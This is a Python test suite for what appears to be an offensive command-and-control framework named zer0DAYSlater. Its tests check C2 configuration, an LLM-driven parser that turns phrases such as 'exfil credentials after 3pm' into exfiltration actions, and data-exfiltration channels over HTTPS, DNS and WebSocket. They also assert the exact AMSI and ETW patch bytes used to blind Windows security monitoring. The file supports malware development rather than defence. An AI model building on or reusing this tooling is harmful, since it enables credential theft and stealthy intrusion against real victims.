"""
zer0DAYSlater core test suite.
Tests parse logic, config loading, and channel interface contracts.
"""
import os
import sys

# Ensure project root is on path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))


# ── Config ────────────────────────────────────────────────────────────────────

def test_config_loads():
    from config import CONFIG
    assert isinstance(CONFIG, dict)
    for key in ("mqtt_broker", "mqtt_port", "https_endpoint", "auth_token",
                 "c2_ws_url", "plugin_server"):
        assert key in CONFIG, f"Missing key in CONFIG: {key}"


def test_config_no_hardcoded_secrets():
    from config import CONFIG
    assert CONFIG["auth_token"] != "test-token", \
        "Hardcoded test-token still present in config"
    assert "yourserver" not in CONFIG.get("c2_ws_url", ""), \
        "Placeholder URL still present in c2_ws_url"
    assert "yourserver" not in CONFIG.get("plugin_server", ""), \
        "Placeholder URL still present in plugin_server"


# ── LLM command parser ────────────────────────────────────────────────────────

def test_parse_exfil_command():
    from llm_command_parser import parse_natural_command
    result = parse_natural_command("exfil user profiles after midnight")
    assert result["action"] == "exfil"
    assert result["filters"].get("target") == "user_profiles"
    assert result["schedule"] is not None


def test_parse_scheduled_time():
    from llm_command_parser import parse_natural_command
    result = parse_natural_command("exfil credentials after 3pm")
    assert result["schedule"] is not None
    assert result["action"] == "exfil"


def test_parse_unknown_command_returns_none_action():
    from llm_command_parser import parse_natural_command
    result = parse_natural_command("do something vague")
    assert result["action"] is None


def test_parse_returns_required_keys():
    from llm_command_parser import parse_natural_command
    result = parse_natural_command("")
    assert "action" in result
    assert "filters" in result
    assert "schedule" in result


# ── Channel interface contracts ───────────────────────────────────────────────

def test_exfil_https_interface():
    """send_via_https and get_task_https must accept agent_id as first arg."""
    import inspect
    from core.exfil_https import send_via_https, get_task_https
    sig_send = inspect.signature(send_via_https)
    sig_get = inspect.signature(get_task_https)
    assert "agent_id" in sig_send.parameters
    assert "agent_id" in sig_get.parameters


def test_exfil_dns_interface():
    import inspect
    from core.exfil_dns import send_via_dns, get_task_dns
    sig_send = inspect.signature(send_via_dns)
    sig_get = inspect.signature(get_task_dns)
    assert "agent_id" in sig_send.parameters
    assert "agent_id" in sig_get.parameters


def test_exfil_ws_interface():
    import inspect
    from core.exfil_ws import send_via_ws, get_task_ws
    sig_send = inspect.signature(send_via_ws)
    sig_get = inspect.signature(get_task_ws)
    assert "agent_id" in sig_send.parameters
    assert "agent_id" in sig_get.parameters


def test_channel_send_returns_bool_when_unconfigured():
    """All send functions must return False (not raise) when env not set."""
    from core.exfil_https import send_via_https
    from core.exfil_dns import send_via_dns
    from core.exfil_ws import send_via_ws
    assert send_via_https("test-agent", {}) is False
    assert send_via_dns("test-agent", {}) is False
    assert send_via_ws("test-agent", {}) is False


def test_channel_get_returns_none_when_unconfigured():
    """All get functions must return None (not raise) when env not set."""
    from core.exfil_https import get_task_https
    from core.exfil_dns import get_task_dns
    from core.exfil_ws import get_task_ws
    assert get_task_https("test-agent") is None
    assert get_task_dns("test-agent") is None
    assert get_task_ws("test-agent") is None


# ── Evasion patch bytes ───────────────────────────────────────────────────────

def test_amsi_patch_bytes_correct():
    """Verify AMSI patch is xor eax,eax; ret — not corrupted escape sequences."""
    import ast
    import pathlib
    src = pathlib.Path("evasion_win.py").read_text()
    # Find the AMSI patch line
    for line in src.splitlines():
        if "patch" in line and "xor eax" in line:
            # Extract the bytes literal
            val = line.split("=")[1].strip().split("#")[0].strip()
            b = ast.literal_eval(val)
            assert b == b"\x31\xc0\xc3", f"AMSI patch bytes wrong: {b.hex()}"
            return
    raise AssertionError("AMSI patch line not found in evasion_win.py")


def test_etw_patch_bytes_correct():
    """Verify ETW patch is xor rax,rax; ret."""
    import ast
    import pathlib
    src = pathlib.Path("evasion_win.py").read_text()
    for line in src.splitlines():
        if "patch" in line and "xor rax" in line:
            val = line.split("=")[1].strip().split("#")[0].strip()
            b = ast.literal_eval(val)
            assert b == b"\x48\x33\xc0\xc3", f"ETW patch bytes wrong: {b.hex()}"
            return
    raise AssertionError("ETW patch line not found in evasion_win.py")
